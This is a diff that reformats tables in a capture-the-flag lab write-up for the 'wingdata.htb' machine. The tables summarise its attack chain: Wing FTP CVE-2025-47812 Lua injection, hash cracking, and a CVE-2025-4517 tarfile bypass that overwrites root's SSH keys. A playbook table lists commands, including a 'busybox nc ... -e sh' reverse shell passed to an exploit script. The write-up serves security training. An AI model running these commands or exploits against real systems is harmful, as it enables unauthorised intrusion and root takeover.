@@ -12,20 +12,20 @@ Services: SSH (22), HTTP (80)
 
 ## Summary of Attack Chain
 
-| Step | User / Access | Technique Used | Result |
-| --- | --- | --- | --- |
-| 1 | N/A (Unauthenticated) | **Network scanning & Subdomain discovery** | Identified `wingdata.htb` and `ftp.wingdata.htb`; discovered Wing FTP Server v7.4.3. |
-| 2 | N/A (Web access) | **CVE-2025-47812 Exploitation** | Exploited NULL byte injection + Lua code execution in Wing FTP admin panel. |
-| 3 | wingftp (Service) | **Reverse Shell Execution** | Injected Lua payload to execute a reverse shell, gaining initial foothold as `wingftp`. |
-| 4 | wingftp | **Credential Hunting** | Located `wacky.xml` in FTP config; extracted SHA256+Salt password hash. |
-| 5 | N/A (Offline) | **Password Cracking** | Cracked the hash (`!#7BlXXXXXXXXXXXXXX`) using Hashcat mode 1410. |
-| 6 | wacky (SSH) | **Lateral Movement via SSH** | Logged in as user `wacky` using cracked credentials; retrieved **user.txt**. |
-| 7 | wacky | **Privilege Enumeration (sudo)** | Discovered `sudo` rights for `restore_backup_clients.py` with wildcard arguments. |
-| 8 | wacky | **Code Analysis** | Identified vulnerable use of `tarfile.extractall(filter='data')` in Python 3.12.3. |
-| 9 | wacky | **CVE-2025-4517 Exploitation** | Crafted a malicious TAR file with deep directory paths (>4096 bytes) to bypass `PATH_MAX`. |
-| 10 | Root | **Arbitrary File Overwrite** | Used the TAR exploit to overwrite `/root/.ssh/authorized_keys` with attacker's public key. |
-| 11 | Root | **Privilege Escalation** | SSH'd into the box as root using the injected key. |
-| 12 | Root | **Flag Capture** | Retrieved **root.txt** from `/root/root.txt`. |
+| Step | User / Access         | Technique Used                               | Result                                                                                   |
+| :--: | :-------------------- | :------------------------------------------- | :--------------------------------------------------------------------------------------- |
+|   1  | N/A (Unauthenticated) | **Network scanning & subdomain discovery**   | Identified `wingdata.htb` and `ftp.wingdata.htb`; discovered **Wing FTP Server v7.4.3**. |
+|   2  | N/A (Web access)      | **CVE-2025-47812 exploitation**              | Abused NULL byte injection and Lua code execution in the Wing FTP admin panel.           |
+|   3  | wingftp (Service)     | **Reverse shell execution (Lua)**            | Injected Lua payload to spawn a reverse shell; gained initial foothold as `wingftp`.     |
+|   4  | wingftp               | **Credential hunting**                       | Located `wacky.xml` in FTP configuration; extracted salted SHA-256 password hash.        |
+|   5  | N/A (Offline)         | **Password cracking (Hashcat)**              | Cracked the hash (`!#7BlXXXXXXXXXXXXXX`) using Hashcat mode 1410.                        |
+|   6  | wacky (SSH)           | **Lateral movement via SSH**                 | Logged in as `wacky` with cracked credentials; retrieved **user.txt**.                   |
+|   7  | wacky                 | **Privilege enumeration (sudo)**             | Discovered sudo rights for `restore_backup_clients.py` with wildcard arguments.          |
+|   8  | wacky                 | **Code analysis (Python tarfile)**           | Identified unsafe `tarfile.extractall(filter='data')` usage in Python 3.12.3.            |
+|   9  | wacky                 | **CVE-2025-4517 exploitation**               | Crafted malicious TAR with path depth >4096 bytes to bypass `PATH_MAX` checks.           |
+|  10  | Root                  | **Arbitrary file overwrite**                 | Overwrote `/root/.ssh/authorized_keys` with attacker’s public key via TAR extraction.    |
+|  11  | Root                  | **Privilege escalation (SSH key injection)** | SSH access obtained as root using injected key.                                          |
+|  12  | Root                  | **Flag capture**                             | Retrieved **root.txt** from `/root/root.txt`.                                            |
 
 
 
@@ -309,11 +309,12 @@ cat /root/root.txt
 
 ### Core Mechansim
 
-| Attribute | Technical Details |
-|  |  |
-| **Primary Identifiers** | `CVE-2025-4517`, Python `tarfile` module, `filter='data'`, `os.path.realpath` |
-| **Critical Vulnerability** | Python versions < 3.12.4 fail to raise errors when `realpath()` encounters paths exceeding `PATH_MAX` (4096 bytes), causing security filters to fail open. |
-| **Offensive Action** | Construction of a malicious TAR archive containing a directory depth exceeding 4096 bytes, followed by a symlink back to the root, effectively bypassing the extraction filter to write to `/root/.ssh/`. |
+| Attribute                  | Technical Details                                                                                                                        |
+| :------------------------- | :--------------------------------------------------------------------------------------------------------------------------------------- |
+| **Primary Identifiers**    | `CVE-2025-4517`, Python `tarfile` module, `filter='data'`, `os.path.realpath`                                                            |
+| **Critical Vulnerability** | Python versions < 3.12.4 fail closed-path validation when `realpath()` exceeds `PATH_MAX` (4096 bytes), allowing filters to fail open.   |
+| **Offensive Action**       | Built a malicious TAR with directory depth >4096 bytes and a symlink redirect, bypassing extraction filters to write into `/root/.ssh/`. |
+
 
 ### Prerequisites
 
@@ -408,11 +409,11 @@ DeviceFileEvents
 
 ## Quick Action Playbook
 
-| Step | Objective | Technical Command / Logic |
-|  |  |  |
-| **01** | **Enumerate** | `nmap -sCV -p- [IP]`; `ffuf -w subdomains.txt -u http://[IP] -H "Host: FUZZ.wingdata.htb"` |
-| **02** | **Exploit (Web)** | `python3 cve-2025-47812.py -u [URL] -c 'busybox nc [IP] [PORT] -e sh'` |
-| **03** | **Crack** | `hashcat -m 1410 hash.txt rockyou.txt` |
-| **04** | **Exploit (Priv)** | Generate TAR with deep paths > 4096 bytes + Symlink to `/root/.ssh/authorized_keys` |
-| **05** | **Execute** | `sudo /usr/local/bin/python3 ... -b malicious.tar -r restore_exploit` |
-| **06** | **Persist** | `ssh -i root_key root@wingdata.htb` |
+| Step | Objective          | Technical Command / Logic                                                                  |
+| :--: | :----------------- | :----------------------------------------------------------------------------------------- |
+|  01  | **Enumerate**      | `nmap -sCV -p- [IP]`; `ffuf -w subdomains.txt -u http://[IP] -H "Host: FUZZ.wingdata.htb"` |
+|  02  | **Exploit (Web)**  | `python3 cve-2025-47812.py -u [URL] -c 'busybox nc [IP] [PORT] -e sh'`                     |
+|  03  | **Crack**          | `hashcat -m 1410 hash.txt rockyou.txt`                                                     |
+|  04  | **Exploit (Priv)** | Generate TAR with deep paths >4096 bytes + symlink to `/root/.ssh/authorized_keys`         |
+|  05  | **Execute**        | `sudo /usr/local/bin/python3 ... -b malicious.tar -r restore_exploit`                      |
+|  06  | **Persist**        | `ssh -i root_key root@wingdata.htb`                                                        |
